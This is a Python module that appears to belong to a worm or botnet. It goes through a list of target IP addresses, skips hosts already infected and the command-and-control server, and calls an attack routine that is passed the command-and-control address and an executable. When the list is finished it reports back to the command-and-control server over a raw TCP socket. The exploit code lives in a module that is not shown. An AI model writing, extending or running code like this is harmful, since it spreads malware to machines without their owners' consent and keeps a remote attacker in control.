import attack
import check_infected
import socket

global status
status = False
global a
a = None
def attack_list(ip_list,cnc_ip,cnc_port,executable,send,prnt,id_str):
	if not isinstance(ip_list, list):
		ip = ip_list
		ip_list = []
		ip_list.append(ip)
	global status
	status = True
	global a
	for ip in ip_list:
		if not status:
			send_finish(cnc_ip,cnc_port,prnt,id_str)
			return
		if ip != cnc_ip and not check_infected.check_infected(ip):
			a = attack
			a.attack(ip,cnc_ip,cnc_port,executable,send,prnt)
	send_finish(cnc_ip,cnc_port,prnt,id_str)

def send_finish(cnc_ip,cnc_port,prnt,id_str):
		stop()
		if prnt:
			print("finished list attack")
			return
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((cnc_ip, int(cnc_port)))
		sock.send(("attacker %s: finished list attack" % id_str).encode())
		sock.close()

def stop():
	global status
	global a
	status = False
	if a:
		a.stop()
	
